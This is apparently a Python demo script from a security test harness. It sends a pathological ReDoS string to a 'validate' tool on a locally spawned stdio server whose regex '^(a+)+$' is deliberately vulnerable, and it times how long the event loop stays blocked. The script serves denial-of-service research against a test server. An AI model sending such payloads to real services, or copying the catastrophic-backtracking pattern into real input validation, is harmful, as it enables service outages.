"""
Vector 7 -- ReDoS in input validation (CWE-1333), stdio transport.

Sends a single pathological string ("a"*length + "!") to the `validate`
tool, which matches it against the deliberately vulnerable pattern
`^(a+)+$` (servers/py_stdio_server.py). Because Python's `re` backtracking
engine runs synchronously inside the server's single asyncio event-loop
thread, one such call blocks ALL other request processing on that
connection for as long as the match takes -- for length ~26 that's
already a couple of seconds (empirically calibrated below), demonstrating
a huge attacker/defender cost asymmetry with a trivially small, trivially
cheap-to-construct payload.

Exposes `send_pathological()` for reuse by run_smoke.py (which owns the
server subprocess so it can sample RSS/CPU concurrently); running this
file directly spawns its own throwaway server instance for a standalone
demo.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, ROOT)

from common.stdio_client import StdioClient


def send_pathological(client: StdioClient, length: int, timeout_s: float):
    payload = "a" * length + "!"
    t0 = time.perf_counter()
    ok, dt, resp = client.call_tool("validate", {"text": payload}, req_id=2, timeout_s=timeout_s)
    return {
        "sent_bytes": len(payload.encode()),
        "ok": 1 if ok else 0,
        "failed": 0 if ok else 1,
        "elapsed_s": (time.perf_counter() - t0),
        "build_s": 1e-7 * length,  # trivial string construction cost
        "response_ok": ok,
        "latency_ms": dt,
    }


def main():
    py = sys.executable
    length = int(sys.argv[1]) if len(sys.argv) > 1 else 26
    timeout_s = float(sys.argv[2]) if len(sys.argv) > 2 else 15.0
    server_script = os.path.join(ROOT, "servers", "py_stdio_server.py")

    proc = subprocess.Popen(
        [py, server_script], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, text=True, bufsize=1,
    )
    try:
        client = StdioClient(proc)
        ok, _ = client.initialize(timeout_s=5.0)
        if not ok:
            print(json.dumps({"error": "init failed"}))
            return
        result = send_pathological(client, length, timeout_s)
        print(json.dumps(result))
    finally:
        proc.kill()


if __name__ == "__main__":
    main()
